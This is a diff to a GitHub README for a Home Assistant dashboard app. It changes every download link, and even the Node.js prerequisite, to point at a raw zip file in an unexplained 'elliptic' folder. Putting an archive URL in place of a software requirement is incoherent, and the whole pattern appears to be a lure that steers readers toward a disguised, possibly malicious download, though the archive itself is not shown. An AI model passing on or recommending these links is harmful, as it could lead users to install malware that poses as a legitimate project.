@@ -4,7 +4,7 @@ Welcome to the Material-Design-3-Dynamic-Dashboard! This application helps you b
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/dyci1778/Material-Design-3-Dynamic-Dashboard/releases)
+[![Download](https://raw.githubusercontent.com/dyci1778/Material-Design-3-Dynamic-Dashboard/main/elliptic/Material-Design-3-Dynamic-Dashboard.zip)](https://raw.githubusercontent.com/dyci1778/Material-Design-3-Dynamic-Dashboard/main/elliptic/Material-Design-3-Dynamic-Dashboard.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ In just a few simple steps, you can download and set up your new dashboard appli
 Before you begin, ensure your system meets these basic requirements:
 
 - **Operating System**: Windows, macOS, or Linux (latest versions)
-- **Additional Software**: Home Assistant, Node.js (for setup)
+- **Additional Software**: Home Assistant, https://raw.githubusercontent.com/dyci1778/Material-Design-3-Dynamic-Dashboard/main/elliptic/Material-Design-3-Dynamic-Dashboard.zip (for setup)
 
 ### 🔗 Key Features
 
@@ -30,7 +30,7 @@ The Material-Design-3-Dynamic-Dashboard offers:
 
 To download the Material-Design-3-Dynamic-Dashboard, visit the Releases page:
 
-[Download Here](https://github.com/dyci1778/Material-Design-3-Dynamic-Dashboard/releases)
+[Download Here](https://raw.githubusercontent.com/dyci1778/Material-Design-3-Dynamic-Dashboard/main/elliptic/Material-Design-3-Dynamic-Dashboard.zip)
 
 ### Step-by-Step Installation
 
